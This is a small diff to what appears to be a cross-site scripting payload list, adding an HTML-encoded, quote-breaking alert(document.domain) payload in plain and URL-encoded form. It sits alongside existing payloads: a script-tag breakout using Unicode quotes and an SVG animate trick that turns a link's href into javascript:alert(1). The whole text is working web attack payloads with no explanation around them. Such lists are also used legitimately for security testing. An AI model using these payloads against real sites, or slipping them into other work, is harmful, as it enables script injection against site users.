@@ -1,4 +1,6 @@
 # xss-payload
+# html encode
+http:&apos;-alert(document.domain)-&apos; -------- %26apos%3B-alert%28document.domain%29-%26apos%3B+
 # Unicode character 
 */</script>‘><script>alert(1)<script>/*<script/1=’
 <svg><a id='xss'><animate begin="xss.click" attributeName="href" dur=5s repeatCount=indefinite keytimes=0;0;1 values="https://ahihihihihi.net;javascript:alert(1);0" /><text x=20 y=20>Click me</text></a></svg>
